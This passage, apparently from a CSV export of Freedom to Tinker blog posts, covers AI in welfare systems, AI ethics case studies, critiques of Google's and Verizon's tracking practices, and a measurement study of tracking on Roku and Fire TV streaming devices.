to create accurate datasets about voter records. Hannah tells us about the many grassroots organizations that they are hoping to empower to collect data for their entire state."
"149","2019-05-29","2023-03-24","https://freedom-to-tinker.com/2019/05/29/conference-on-social-protection-by-artificial-intelligence-decoding-human-rights-in-a-digital-age/","Christiaan van Veen[1] and Ben Zevenbergen [2] Governments around the world are increasingly using Artificial Intelligence and other digital technologies to streamline and transform their social protection and welfare systems. This move is usually presented as a means by which to provide an improved and enhanced system and to be better able to assist individuals in a more targeted and efficient manner. But because social protection budgets represent such a significant part of State expenditure in most countries, and because austerity and tax-cuts continue to drive policy, the driving force is usually the prospect of major budgetary savings and a greatly slimmed down system of benefits. But it is becoming increasingly apparent that the impact of these new technologies on the nature of the social protection systems themselves and on the lives of the many individuals who rely upon them can be far-reaching and very often problematic. There are many examples of systems that are being challenged, ranging from the disastrous ‘robo-debt’ saga in Australia to the litigation and protest against the massive biometric identification system – Aadhaar – in India. Yet, the push for digital innovation in this area of government is certain to continue. These developments have significant implications for the human rights of roughly half of the world’s population who are covered by social protection measures, as well as those who are not yet covered. Social protection itself is a human right[3] with a long and rich history, dating back to the creation of the International Labour Organization by the 1919 Treaty of Versailles. The introduction of digital technologies in social protection systems risks creating barriers to access to this right, although one can also imagine ways in which technology can facilitate access to social protection. A range of other human rights are implicated with the introduction of these new technologies in social protection systems, ranging from the right to a remedy to the right to privacy. Despite the significant risks and opportunities involved with the introduction of digital technologies, there has been only limited research and analysis undertaken to better understand the implications for the protection of human rights, especially in the area of social protection/welfare. The poorest and most vulnerable individuals, both in the Global North and Global South, are inevitably the ones who will be most affected by these developments. To highlight these issues, the Center for Information Technology Policy and the United Nations Special Rapporteur on extreme poverty and human rights, organized a conference at Princeton University on April 12, 2019. The conference brought together leading experts from academia, NGOs, international organizations and the private sector to further explore the implications of digital technologies in social protection systems. The conference was also part of a consultation for a report that the UN Special Rapporteur is preparing and will present to the United Nations General Assembly in October of this year. Below, a few of the experts who spoke at the conference present some of their key issues and concerns where it comes to the human rights implications of digital technologies in welfare systems. Cary Coglianese, Edward B. Shils Professor of Law at the University of Pennsylvania Law School Government has an important responsibility to help provide social services and financial support to those in need. Let us imagine a future where, seeking to fulfill this responsibility, government develops a sophisticated system to help it identify those applicants who qualify for support. But imagine further that, in the end, this identification system turns out to award benefits arbitrarily and to prefer white applicants over applicants of color. Such a system would be properly condemned as unfair. And this is exactly what worries critics who oppose the use of artificial intelligence in administering social programs. Yet the future imagined above actually appears to have arrived long ago. By many accounts, the scenario I have painted describes the system already in place in the United States and presumably other countries. It is just that the “technology” underlying the current identification system is not artificial intelligence but human decision-making. The U.S. Social Security Administration’s (SSA) disability system, for example, relies on more than a thousand human adjudicators. Although most of these officials are no doubt well-trained and dedicated, they also work under heavy caseloads. And for decades, studies have suggested that racial disparities exist in SSA disability awards, with certain African-American applicants tending to receive less favorable outcomes compared with white applicants. Any system that relies on thousands of human decision-makers working at high capacity will surely yield variable outcomes. A 2011 report issued by independent researchers offers a stark illustration of the potential for variability across humans: among the fifteen most active administrative judges in a Dallas SSA office, “the judge grant rates in this single location ranged … from less than 10 percent being granted to over 90 percent.” The researchers reported that three judges in this office awarded benefits to no more than 30 percent of their applicants, while three judges awarded to more than 70 percent. In light of reasonable concerns about arbitrariness and bias in human decisions, the relevant question to ask about artificial intelligence is not whether it will be free of any bias or unexplainable variation. Rather, the question should be whether artificial intelligence can perform better than the current human-based system. Anyone concerned about fairness in government decision-making should entertain the possibility that digital algorithms might sometimes prove to be fairer and more consistent than humans. At the very least, it might turn out to be easier to remedy biased algorithms than to remove deeply ingrained implicit biases from human decision-making. Jonathan McCully and Nani Jansen Reventlow, Digital Freedom Fund International law obliges states to provide an effective remedy to victims of human rights violations, but how can this obligation be met in the age of AI? At the conference, a number of points were raised in relation to this question. For systems of redress or reparation to work, there needs to be a traceable line of responsibility. This is muddied in the AI context as public and private entities claim that certain decisions are reached by machine learning algorithms that lack human intervention. Human rights are devoid of content if victims cannot hold a natural or legal person to account for decisions violating their rights. Therefore, liability regimes should not allow individuals, private entities or public authorities to hide behind their AI. For individuals to effectively pursue remedies for AI-related human rights violations, there needs to be an equality of arms. This is also made difficult by AI, where the “allure of objectivity” presented by algorithms can mean that victims are held to a higher standard of evidence compared to those deploying an algorithm. This needs to be corrected. Finally, like surveillance, AI-related human rights violations can often be hidden from victims. Those who have been subject to an AI-based decision do not necessarily know about it and, even before a decision has been reached against an individual, the models generating these decisions are often trained on datasets that have been processed without the knowledge or consent of those to whom the data relates. Transparency is, therefore, vital to an individual’s ability to pursue remedies in the AI context. Jennifer Raso, Assistant Professor, University of Alberta Faculty of Law Current discussions about algorithmic systems and social protection tend to overlook two key issues. First, the “new” technologies in today’s welfare programs are evolutionary rather than revolutionary. For decades, social assistance offices have been the first sites in which governments introduce new tools to streamline bureaucratic decisions in a context of perpetuated (and seemingly perpetual) resource scarcity. These tools (new and old) are laborious for all who interact with them. They regularly malfunction and require intrusive data about benefits recipients. Such tools perform a dual deterrence: they discourage people from seeking state-funded assistance; and they prevent front-line workers from providing vulnerable individuals access to last-resort assistance. Second, by centring our debates on privacy and transparency, we fail to address all that is at stake. Focusing on data protection ignores that data intensity is a long-standing feature of social assistance programs. What does privacy mean to someone who must report intimate personal details to remain eligible for welfare benefits? Likewise, transparency conversations overlook the importance of substantive outcomes. How would a transparent decision-making process address the fact that, in many places, welfare rates fall far short of covering one’s basic needs? Instead, we should be into the needs and interests of people who require assistance. Going forward, we must centre the experiences of those most deeply affected by algorithmic systems. To fully comprehend the impact of these tools in social protection programs, and their potential human rights implications, it is crucial that we attend to the people and communities most targeted by algorithmic systems, and to the front-line workers responsible for maintaining and working with these tools. Please find here the video of the opening and first panel of the conference, and here the video of the second panel. [1] Director of the Digital Welfare State and Human Rights Project at the Center for Human Rights and Global Justice at New York University School of Law and Special Advisor on new technologies and human rights to the UN Special Rapporteur on extreme poverty and human rights: https://chrgj.org/people/christiaan-van-veen/ [2] Professional Specialist at CITP, Princeton University. [3] See, e.g., article 9 of the International Covenant on Economic, Social and Cultural Rights, ratified by 169 States."
"150","2018-05-21","2023-03-24","https://freedom-to-tinker.com/2018/05/21/princeton-dialogues-of-ai-and-ethics-launching-case-studies/","Summary: We are releasing four case studies on AI and ethics, as part of the Princeton Dialogues on AI and Ethics. The impacts of rapid developments in artificial intelligence (“AI”) on society—both real and not yet realized—raise deep and pressing questions about our philosophical ideals and institutional arrangements. AI is currently applied in a wide range of fields—such as medical diagnosis, criminal sentencing, online content moderation, and public resource management—but it is only just beginning to realize its potential to influence practically all areas of human life, including geopolitical power balances. As these technologies advance and increasingly come to mediate our everyday lives, it becomes necessary to consider how they may reflect prevailing philosophical perspectives and preferences. We must also assess how the architectural design of AI technologies today might influence human values in the future. This step is essential in order to identify the positive opportunities presented by AI and unleash these technologies’ capabilities in the most socially advantageous way possible while being mindful of potential harms. Critics question the extent to which individual engineers and proprietors of AI should take responsibility for the direction of these developments, or whether centralized policies are needed to steer growth and incentives in the right direction. What even is the right direction? How can it be best achieved? Princeton’s University Center for Human Values (UCHV) and the Center for Information Technology Policy (CITP) are excited to announce a joint research project, “The Princeton Dialogues on AI and Ethics,” in the emerging field of artificial intelligence (broadly defined) and its interaction with ethics and political theory. The aim of this project is to develop a set of intellectual reasoning tools to guide practitioners and policy makers, both current and future, in developing the ethical frameworks that will ultimately underpin their technical and legislative decisions. More than ever before, individual-level engineering choices are poised to impact the course of our societies and human values. And yet there have been limited opportunities for AI technology actors, academics, and policy makers to come together to discuss these outcomes and their broader social implications in a systematic fashion. This project aims to provide such opportunities for interdisciplinary discussion, as well as in-depth reflection. We convened two invitation-only workshops in October 2017 and March 2018, in which philosophers, political theorists, and machine learning experts met to assess several real-world case studies that elucidate common ethical dilemmas in the field of AI. The aim of these workshops was to facilitate a collaborative learning experience which enabled participants to dive deeply into the ethical considerations that ought to guide decision-making at the engineering level and highlight the social shifts they may be affecting. The first outcomes of these deliberations have now been published in the form of case studies. To access these educational materials, please see our dedicated website https://aiethics.princeton.edu. These cases are intended for use across university departments and in corporate training in order to equip the next generation of engineers, managers, lawyers, and policy makers with a common set of reasoning tools for working on AI governance and development. In March 2018, we also hosted a public conference, titled “AI & Ethics,” where interested academics, policy makers, civil society advocates, and private sector representatives from diverse fields came to Princeton to discuss topics related to the development and governance of AI: “International Dimensions of AI” and “AI and Its Democratic Frontiers”. This conference sought to use the ethics and engineering knowledge foundations developed through the initial case studies to inspire discussion on AI technology’s wider social effects. This project is part of a wider effort at Princeton University to investigate the intersection between AI technology, politics, and philosophy. There is a particular emphasis on the ways in which the interconnected forces of technology and its governance simultaneously influence and are influenced by the broader social structures in which they are situated. The Princeton Dialogues on AI and Ethics makes use of the university’s exceptional strengths in computer science, public policy, and philosophy. The project also seeks opportunities for cooperation with existing projects in and outside of academia."
"151","2019-08-23","2023-03-24","https://freedom-to-tinker.com/2019/08/23/deconstructing-googles-excuses-on-tracking-protection/","By Jonathan Mayer and Arvind Narayanan. Blocking cookies is bad for privacy. That’s the new disingenuous argument from Google, trying to justify why Chrome is so far behind Safari and Firefox in offering privacy protections. As researchers who have spent over a decade studying web tracking and online advertising, we want to set the record straight. Our high-level points are: 1) Cookie blocking does not undermine web privacy. Google’s claim to the contrary is privacy gaslighting. 2) There is little trustworthy evidence on the comparative value of tracking-based advertising. 3) Google has not devised an innovative way to balance privacy and advertising; it is latching onto prior approaches that it previously disclaimed as impractical. 4) Google is attempting a punt to the web standardization process, which will at best result in years of delay. What follows is a reproduction of excerpts from yesterday’s announcement, annotated with our comments. Technology that publishers and advertisers use to make advertising even more relevant to people is now being used far beyond its original design intent – to a point where some data practices don’t match up to user expectations for privacy. Google is trying to thread a needle here, implying that some level of tracking is consistent with both the original design intent for web technology and user privacy expectations. Neither is true. If the benchmark is original design intent, let’s be clear: cookies were not supposed to enable third-party tracking, and browsers were supposed to block third-party cookies. We know this because the authors of the original cookie technical specification said so (RFC 2109, Section 4.3.5). Similarly, if the benchmark is user privacy expectations, let’s be clear: study after study has demonstrated that users don’t understand and don’t want the pervasive web tracking that occurs today. Recently, some other browsers have attempted to address this problem, but without an agreed upon set of standards, attempts to improve user privacy are having unintended consequences. This is clearly a reference to Safari’s Intelligent Tracking Prevention and Firefox’s Enhanced Tracking Protection, which we think are laudable privacy features. We’ll get to the unintended consequences claim. First, large scale blocking of cookies undermine people’s privacy by encouraging opaque techniques such as fingerprinting. With fingerprinting, developers have found ways to use tiny bits of information that vary between users, such as what device they have or what fonts they have installed to generate a unique identifier which can then be used to match a user across websites. Unlike cookies, users cannot clear their fingerprint, and therefore cannot control how their information is collected. We think this subverts user choice and is wrong. To appreciate the absurdity of this argument, imagine the local police saying, “We see that our town has a pickpocketing problem. But if we crack down on pickpocketing, the pickpocketers will just switch to muggings. That would be even worse. Surely you don’t want that, do you?” Concretely, there are several things wrong with Google’s argument. First, while fingerprinting is indeed a privacy invasion, that’s an argument for taking additional steps to protect users from it, rather than throwing up our hands in the air. Indeed, Apple and Mozilla have already taken steps to mitigate fingerprinting, and they are continuing to develop anti-fingerprinting protections. Second, protecting consumer privacy is not like protecting security—just because a clever circumvention is technically possible does not mean it will be widely deployed. Firms face immense reputational and legal pressures against circumventing cookie blocking. Google’s own privacy fumble in 2012 offers a perfect illustration of our point: Google implemented a workaround for Safari’s cookie blocking; it was spotted (in part by one of us), and it had to settle enforcement actions with the Federal Trade Commission and state attorneys general. Afterward, Google didn’t double down—it completely backed away from tracking cookies for Safari users. Based on peer-reviewed research, including our own, we’re confident that fingerprinting continues to represent a small proportion of overall web tracking. And there’s no evidence of an increase in the use of fingerprinting in response to other browsers deploying cookie blocking. Third, even if a large-scale shift to fingerprinting is inevitable (which it isn’t), cookie blocking still provides meaningful protection against third parties that stick with conventional tracking cookies. That’s better than the defeatist approach that Google is proposing. This isn’t the first time that Google has used disingenuous arguments to suggest that a privacy protection will backfire. We’re calling this move privacy gaslighting, because it’s an attempt to persuade users and policymakers that an obvious privacy protection—already adopted by Google’s competitors—isn’t actually a privacy protection. Second, blocking cookies without another way to deliver relevant ads significantly reduces publishers’ primary means of funding, which jeopardizes the future of the vibrant web. Many publishers have been able to continue to invest in freely accessible content because they can be confident that their advertising will fund their costs. If this funding is cut, we are concerned that we will see much less accessible content for everyone. Recent studies have shown that when advertising is made less relevant by removing cookies, funding for publishers falls by 52% on average. The overt paternalism here is disappointing. Google is taking the position that it knows better than users—if users had all the privacy they want, they wouldn’t get the free content they want more. So no privacy for users. As for the “recent studies” that Google refers to, that would be one paragraph in one blog post presenting an internal measurement conducted by Google. There is a glaring omission of the details of the measurement that are necessary to have any sort of confidence in the claim. And as long as we’re comparing anecdotes, the international edition of the New York Times recently switched from tracking-based behavioral ads to contextual and geographic ads—and it did not experience any decrease in advertising revenue. Independent research doesn’t support Google’s claim either: the most recent academic study suggests that tracking only adds about 4% to publisher revenue. This is a topic that merits much more research, and it’s disingenuous for Google to cherry pick its own internal measurement. And it’s important to distinguish the economic issue of whether tracking benefits advertising platforms like Google (which it unambiguously does) from the economic issue of whether tracking benefits publishers (which is unclear). Starting with today’s announcements, we will work with the web community to develop new standards that advance privacy, while continuing to support free access to content. Over the last couple of weeks, we’ve started sharing our preliminary ideas for a Privacy Sandbox – a secure environment for personalization that also protects user privacy. Some ideas include new approaches to ensure that ads continue to be relevant for users, but user data shared with websites and advertisers would be minimized by anonymously aggregating user information, and keeping much more user information on-device only. Our goal is to create a set of standards that is more consistent with users’ expectations of privacy. There is nothing new about these ideas. Privacy preserving ad targeting has been an active research area for over a decade. One of us (Mayer) repeatedly pushed Google to adopt these methods during the Do Not Track negotiations (about 2011-2013). Google’s response was to consistently insist that these approaches are not technically feasible. For example: “To put it simply, client-side frequency capping does not work at scale.” We are glad that Google is now taking this direction more seriously, but a few belated think pieces aren’t much progress. We are also disappointed that the announcement implicitly defines privacy as confidentiality. It ignores that, for some users, the privacy concern is behavioral ad targeting—not the web tracking that enables it. If an ad uses deeply personal information to appeal to emotional vulnerabilities or exploits psychological tendencies to generate a purchase, then that is a form of privacy violation—regardless of the technical details. We are following the web standards process and seeking industry feedback on our initial ideas for the Privacy Sandbox. While Chrome can take action quickly in some areas (for instance, restrictions on fingerprinting) developing web standards is a complex process, and we know from experience that ecosystem changes of this scope take time. They require significant thought, debate, and input from many stakeholders, and generally take multiple years. Apple and Mozilla have tracking protection enabled, by default, today. And Apple is already testing privacy-preserving ad measurement. Meanwhile, Google is talking about a multi-year process for a watered-down form of privacy protection. And even that is uncertain—advertising platforms dragged out the Do Not Track standardization process for over six years, without any meaningful output. If history is any indication, launching a standards process is an effective way for Google to appear to be doing something on web privacy, but without actually delivering. In closing, we want to emphasize that the Chrome team is full of smart engineers passionate about protecting their users, and it has done incredible work on web security. But it is unlikely that Google can provide meaningful web privacy while protecting its business interests, and Chrome continues to fall far behind Safari and Firefox. We find this passage from Shoshana Zuboff’s The Age of Surveillance Capitalism to be apt: “Demanding privacy from surveillance capitalists or lobbying for an end to commercial surveillance on the internet is like asking old Henry Ford to make each Model T by hand. It’s like asking a giraffe to shorten its neck, or a cow to give up chewing. These demands are existential threats that violate the basic mechanisms of the entity’s survival.” It is disappointing—but regrettably unsurprising—that the Chrome team is cloaking Google’s business priorities in disingenuous technical arguments. Thanks to Ryan Amos, Kevin Borgolte, and Elena Lucherini for providing comments on a draft."
"152","2018-04-12","2023-03-24","https://freedom-to-tinker.com/2018/04/12/when-the-business-model-is-the-privacy-violation/","Sometimes, when we worry about data privacy, we’re worried that data might fall into the wrong hands or be misused for unintended purposes. If I’m considering participating in a medical study, I’d want to know if insurance companies will obtain the data and use it against me. In these scenarios, we should look for ways to preserve the intended benefit while preventing unintended uses. In other words, achieving utility and privacy is not a zero-sum game. [1] In other situations, the intended use is the privacy violation. The most prominent example is the tracking of our online and offline habits for targeted advertising. This business model is exactly what people object to, for a litany of reasons: targeting is creepy, manipulative, discriminatory, and reinforces harmful stereotypes. The data collection that enables targeted advertising involves an opaque surveillance infrastructure to which it’s impossible to give meaningfully informed consent, and the resulting databases give a few companies too much power over individuals and over democracy. [2] In response to privacy laws, companies have tried to find technical measures that obfuscate the data but allow them carry on with the surveillance business as usual. But that’s just privacy theater. Technical steps that don’t affect the business model are of limited effectiveness, because the business model is fundamentally at odds with privacy; this is in fact a zero-sum game. [3] For example, there’s an industry move to replace email addresses and other personal identifiers with hashed versions. But a hashed identifier is nevertheless a persistent, unique identifier that allows linking a person across databases, devices, and contexts, as well as targeting and manipulation on the basis of the associated data. Thus, hashing completely fails to address the underlying privacy concerns. Policy makers and privacy advocates must recognize when privacy is a zero-sum game and when it isn’t. Policy makers like non-zero sum games because they can simultaneously satisfy different stakeholders. But they must acknowledge that sometimes this isn’t possible. In such cases, laws and regulations should avoid loopholes that companies might exploit by building narrow technical measures and claiming to be in compliance. [4] Privacy advocates should recognize that framing a concern about data use practices as a privacy problem is a double-edged sword. Privacy can be a convenient label for a set of related concerns, but it gives industry a way to deflect attention from deeper ethical questions by interpreting privacy narrowly as confidentiality. Thanks to Ed Felten and Nick Feamster for feedback on a draft. [1] There is a vast computer science privacy literature predicated on the idea that we can have our cake and eat it too. For example, differential privacy seeks to enable analysis of data in the aggregate without revealing individual information. While there are disagreements on the specifics, such as whether de-identification results a win-win outcome, there is no question that the overall direction of privacy-preserving data analysis is an important one. [2] In Mark Zuckerberg’s congressional testimony, he framed Facebook’s privacy woes as being about improper third-party access to the data. This is arguably a non-zero sum game, and one that Facebook is equipped to address without the need for legislation. However, the much bigger privacy problem is Facebook’s own data collection and business model, which is inherently at odds with privacy and is unlikely to be solved without legislation. [3] There are research proposals for targeted advertising, such as Adnostic, that would improve privacy by drastically changing the business model, largely cutting out the tracking companies. Unsurprisingly, there has been no interest in these approaches from the traditional ad tech industry, but some browser vendors have experimented with similar ideas. [4] As an example of avoiding the hashing loophole, the 2012 FTC privacy report is well written: it says that for data to be considered de-identified, “the company must achieve a reasonable level of justified confidence that the data cannot reasonably be used to infer information about, or otherwise be linked to, a particular consumer, computer, or other device.” It goes on to say that “reasonably” includes reasonable assumptions about the use of external data sources that might be available."
"153","2019-09-18","2023-03-24","https://freedom-to-tinker.com/2019/09/18/watching-you-watch-the-tracking-ecosystem-of-over-the-top-tv-streaming-devices/","By Hooman Mohajeri Moghaddam, Gunes Acar, Ben Burgess, Arunesh Mathur, Danny Y. Huang, Nick Feamster, Ed Felten, Prateek Mittal, and Arvind Narayanan By 2020 one third of US households are estimated to “cut the cord”, i.e., discontinue their multichannel TV subscriptions and switch to internet-connected streaming services. Over-the-Top (“OTT”) streaming devices such as Roku and Amazon Fire TV, which currently sell between for $30 to $100, are cheap alternatives to smart TVs for cord-cutters. Instead of charging more for the hardware or the membership, Roku and Amazon Fire TV monetize their platforms through advertisements, which rely on tracking users’ viewing habits. Although tracking of users on the web and on mobile is well studied, tracking on smart TVs and OTT devices has remained unexplored. To address this gap, we conducted the first study of tracking on OTT platforms. In a paper that we will present at the ACM CCS 2019 conference, we found that: Major online trackers such as Google and Facebook are also highly prominent in the OTT ecosystem. However, OTT channels also contain niche and lesser known trackers such as adrise.tv and monarchads.com. The information shared with tracker domains includes video titles (see Figure 1), channel names, permanent device identifiers and wireless SSIDs. Countermeasures made available to users are ineffective at preventing tracking. Roku had a vulnerability that allowed malicious web pages visited by Roku users to geolocate users, read device identifiers and install channels without their consent. Figure 1. AsianCrush channel on Roku sends the device ID and video title to online video advertising platform spotxchange.com Method and Findings: Similar to how Android or iOS supports third-party apps, Amazon and Roku support third-party applications known as channels, ranging from popular channels like Netflix and CNN to several obscure ones. Automation is one of the main challenges of studying how these channels track users. Tools that automate interaction with web pages (such as Selenium) do not exist for OTT platforms. To address this challenge, we developed a system that can automatically download OTT channels and interact with them all while intercepting the network traffic and performing best-effort TLS interception. We describe the different components of our tool in the Appendix. Using this crawler we collected data from the top 1000 channels on both Roku and the Amazon Fire TV channel stores. The distribution of trackers by channel category and rank is shown in Figure 2. The “Games” category of Roku channels contact the most trackers: nine of the top ten channels (ordered by the number of trackers) are categorized as game channels. On the other hand, five of the ten Fire TV channels with the most trackers are “News” channels, where the top three channels contact close to 60 tracker domains each. Below we summarize our findings: Figure 2. Distribution of trackers by channel ranks and channel categories. Google and Facebook are among the most popular trackers Google and Facebook domains (doubleclick.net, google-analytics.com, googlesyndication.com and facebook.com) are among the most prevalent trackers in the OTT channels on both platforms we studied. Google’s doubleclick.net appeared on 975 of the top 1000 Roku channels, while amazon-adsystem.com appeared on 687 of the top 1000 Amazon Fire TV channels. Table 1. Most prevalent trackers on top 1000 channels on Roku (left) and Amazon (right). User and device identifiers shared with trackers Trackers have access to a wide range of device and user identifiers on OTT platforms. Some of these identifiers can be reset by users (e.g., Advertising IDs), while others are permanent (e.g., serial numbers, MAC addresses). To detect the identifiers shared with trackers, we followed the method described by Englehardt et al. to search for device and user identifiers in the network traffic of the top 1000 channels for each platform. This allowed us to detect leaks even when the identifiers were encoded or hashed. An overview of the leaked IDs on each platform is given in Table 2. Table 2. Overview of identifier and information leakage detected in the Roku (left) and the FireTV (right) crawls. Channels share video titles with third-party trackers Out of 100 randomly selected channels on Roku and Amazon, we found 9 channels on Roku (e.g., “CBS News” and “News 5 Cleveland WEWS”) and 14 channels on the Fire TV (e.g., “NBC News” and “Travel Channel”) that leaked the title of the video to a tracking domain. On Roku, all video titles were leaked over unencrypted connections, exposing user video history to eavesdroppers. On Fire TV, only two channels (NBC News and WRAL) used an unencrypted connection when sending the title to tracking domains. Overwhelming majority of the channels use unencrypted connections Out of the 1000 channels we studied on Roku and Amazon Fire TV, 794 channels on Roku and 762 on Amazon Fire TV had at least one unencrypted HTTP session, potentially exposing users’ information and identities to network adversaries. Countermeasures OTT platforms provide privacy options that purport to limit tracking on their devices: “Limit Ad Tracking” on Roku and ”Disable Interest-based Ads” on Amazon Fire TV. Our measurements show that these privacy options fall short of preventing tracking. Turning on these options did not change the number of trackers contacted. Turning on “Limit Ad Tracking” on Roku reduced the number of AD ID leaks from 390 to zero, but did not change the number of serial number leaks. Roku Remote Control API Vulnerability To investigate other ways OTT devices may compromise user privacy and security, we analyzed local API endpoints of Roku and Fire TV. OTT devices expose such interfaces to enable debugging, remote control, and home automation by mobile apps and other automation software. We discovered a vulnerability in the Roku’s remote control API that allows an attacker to: send commands to install/uninstall/launch channels and collect unique identifiers from Roku devices – even when the connected display is turned off. geolocate Roku users via the SSID of the wireless network extract MAC address, serial number, and other unique identifiers to track users or respawn tracking identifiers (similar to evercookies). get the list of installed channels and use it for profiling purposes. We reported the vulnerability to Roku in December 2018. Roku addressed the issue and finalized rolling out their security fix by March 2019. Going forward Our research shows that users, who are already being pervasively tracked on the web and mobile, face another set of privacy-intrusive tracking practices when using their OTT streaming platforms. A combination of technical and policy solutions can be considered when addressing these privacy and security issues. OTT platforms should offer better privacy controls, similar to Incognito/Private Browsing Mode of modern web browsers. Insecure connections should be disincentivized by platform policies. For example, clear-text connections should be blocked unless an exception is requested by the channel. Regulators and policy makers should ensure the privacy protections available for brick and mortar video rental services, such as Video Privacy Protection Act (VPPA), are updated to cover emerging OTT platforms. Appendix Crawler architecture: We set out to build a crawler to study tracking and privacy practices of OTT channels at scale. Our crawler installs a channel, launches it, and attempts to view a video on the channel, while collecting network traffic and attempting “best-effort” TLS interception. The crawler consists of a number of different hardware devices: A desktop machine connected to the Internet acts as a wireless access point (AP). An OTT stick connects to the Internet via the WiFi AP provided by the desktop machine. It also connects to a TV through an HDMI Capture and Split Card to sidestep the HDCP protections. The desktop machine orchestrates our crawls and has the following software components: Automatic interaction engine: Remote Control API: OTT platforms provide an API to enable remote control apps to send commands such as switching or installing channels. We wrote our own wrappers for both Roku and Amazon Fire TV’s remote APIs. Audio/Video processing: We process the audio from the OTT device on the desktop machine and use it to detect video playback, which guides our automatic interaction with channels. Video input is also saved as screenshots for post-processing and validation. Network Capture: We collect network traffic of the OTT devices as pcap files and dump all DNS transactions in a Redis database. TLS interception: We use mitmproxy to perform “best-effort” TLS interception. For each channel and each new TLS endpoint, we attempt to intercept the traffic using a self-signed certificate. If the interception fails, we add the endpoint to a no-intercept list to avoid further interception attempts. On Amazon Fire TV, we manage to root the device using a previously known vulnerability, and install mitmproxy’s self-signed certificate on the device certificate store. In addition, we use Frida to bypass certificate pinning. Figure 3. Overview of our smart crawler."
"154","2015-01-14","2023-03-24","https://freedom-to-tinker.com/2015/01/14/verizons-tracking-header-can-they-do-better/","Verizon’s practice of injecting a unique ID into the HTTP headers of traffic originating on their wireless network has alarmed privacy advocates and researchers. Jonathan Mayer detailed how this header is already being used by third-parties to create zombie cookies. In this post, I summarize just how much information Verizon collects and shares under their marketing programs. I’ll show how the implementation of the header makes previous tracking methods trivial and explore the possibility of a more secure design. The process by which Verizon can share data with third-parties using the header has been described in a patent and discussed in several previous posts. As a summary, Verizon has two marketing programs: Relevant Mobile Advertising and Verizon Selects, and also seems to have an authentication program in the works. Here’s what Verizon has stated it may share via the UIDH: For marketing purposes, Verizon uses the UIDH as a publicly known unique identifier that it will associate advertising segments to through its data sharing API. The information used to generate these segments depends on the user’s settings. By default, the Relevant Mobile Advertising (RMA) program is opt-out, meaning user data will be shared unless a user explicitly forbids it. Under RMA, Verizon will use information from the subscribers account (e.g. age, gender, location) as well as “interest categories obtained from other companies” to build the segments. So, not only is Verizon using subscriber information to build segments, they are also using it to purchase additional information from data brokers? This is rather unsettling for an opt-out program. Additionally, if users opt-in to the Verizon Selects program, Verizon has stated they will use behavioral data (including app usage, web browsing, and device location history) to enable marketers to deliver “more relevant information”. Verizon describes several other uses for the header which relate to supporting an authentication mechanism for sites, providing customer information for form filling, or verifying that specific information is valid according to the customer records they hold. These systems are designed around the fact that Verizon completely controls the placement of headers and thus the headers can be relied upon as a proxy for the user’s identity allowing the service to query it for extra information or verification of user provided information. It is unclear how much user interaction Verizon would require under each of these use cases as it doesn’t appear that any have been deployed. Verizon’s header makes tracking much easier … and that’s before any additional data is transmitted. Since the header is injected into all HTTP requests originating on their mobile network, all recipients receive the same header, regardless of their business relationship with Verizon. Verizon assures that they “change the UIDH on a regular basis to protect the privacy of [their] customers”, but that simply isn’t enough. For traffic that includes a UIDH value, many attacks against a user’s privacy are trivially achievable. Our study shows how the pervasiveness of cookies can enable a network adversary, such as the NSA, who passively collects HTTP traffic to piece together a user’s browsing history. This attack is now much easier; instead of trying to connect page visits with overlapping cookie values, an adversary can simply link traffic by UIDH value, knowing each value is a single user. The current system of browser cookies forces at least some portion of the interaction between trackers to be visible in the browser (for example, cookie syncing). This has allowed some interesting studies to happen, such as a measurement of ad bid prices done by Inria. The Verizon UIDH follows a seemingly emergent trend of a consolidation of identifiers and identities on the web. [5] The Verizon header eliminates any need for client-side interactions, and instead, all server-server interactions could occur in secret. Typically, trackers need some persistent state on the user’s browser or a persistent fingerprint to keep a profile of the user’s activity. This can prove difficult as a user clears cookies or as browser fingerprints slowly drift (although attacks like canvas fingerprinting may make them more robust). The UIDH value allows a tracker to only need an identifier to remain constant immediately before and after Verizon updates that user’s UIDH, meaning users have to time their cookie clearing precisely to Verizon’s unknown update schedule. [6] As Jonathan showed in his blog post, that UIDH value can even be used to respawn alternate IDs on the user’s machine. I did some checks with our own infrastructure and have released the code and data. I used OpenWPM to drive Firefox to visit the top 500 Alexa sites with different combinations of UIDH values inserted into all HTTP traffic via the mitmproxy instance built into the infrastructure. By seeing which cookies were set for some combination of UIDH headers but not others, I was able to extract the values that may be tied to the UIDH value and manually inspect them. The results were very similar to those discussed in Jonathan’s post. How to reduce the privacy impact Let’s explore what Verizon can do to reduce the impact on privacy? The UIDH header is currently helpful in three different scenarios: (1) a passive network adversary looking to conduct surveillance on the network, (2) a tracker who sees the UIDH but does not utilize the data API, and (3) a tracker who sees the UIDH and does utilize the data API. Case (1) and (2) currently benefit from the UIDH values even though they do not interact with Verizon. A simple way to prevent the header from being useful in these cases is for Verizon to change the header with each HTTP request. They could store a short term mapping of tokens to subscribers to support any API calls, or could trade computation for space and implement something along the lines of E(user ID | nonce). Either way, the information would not be useful to parties that do not have a business relationship with Verizon. Under this new model, it may seem that trackers who utilize Verizon’s API will be forced to contact Verizon with each new request. However, if trackers rely on their own tracking they only need to make requests for each new visitor they see, or when they feel the segment data may need updating. This makes sense from both a privacy perspective and a business perspective; it prevents “freeloading” on the Verizon header and only makes it useful for those who have business relationships with Verizon. Similarly, this design would continue to support the use cases detailed above. Is it enough? I am not convinced that all of the privacy issues introduced by the header can be solved without eliminating it, even with the improvements discussed in this post. The problem is more fundamental than the header simply remaining constant. The UIDH pipeline introduces a consistent state (i.e. the user’s information) into the otherwise dynamic nature of web tracking. Although browser fingerprinting does this to some extent, users can change their device or lie about their browser properties. Demographic data is identifying, and we don’t know to what extent the Verizon segments detailed in the above figure reveal personal information. Unlike demographic data that may be built and sold by data brokers, the Verizon demographic data is pulled directly from subscriber information and is distributed directly to its partners; there is no possibility for incorrect or incomplete information. A combination of Verizon advertising segment information and device information could very well provide enough information to uniquely identify users, once again enabling persistent tracking. Like Verizon, internet service providers are in a position to have a very clear picture of a user’s online life, though they are typically not thought of as “tracking” companies. Historically, ISPs have not shared any information with marketers, but are in a clear position to be the ultimate trackers. Active ISP participation in the data market significantly reduces traditional client-side protections (such as ad and script blocking), as any HTTP data is fair game. Even if a users attempts to block connections to third-party domains, the ISP will still be able to sell data based on the user’s visits to any HTTP pages. This adds to the mounting evidence Internet traffic should be transmitted over HTTPS, giving users at least some control over who can view their data. Special thanks to Arvind Narayanan, Jonathan Mayer, and Jacob Hoffman-Andrews for sharing their comments with me, and additionally to Jonathan for sharing his research. Any errors are, of course, my own. [1] The Relevant Mobile Advertising (RMA) program and its use in connection with the header is discussed in the UIDH FAQ, the RMA 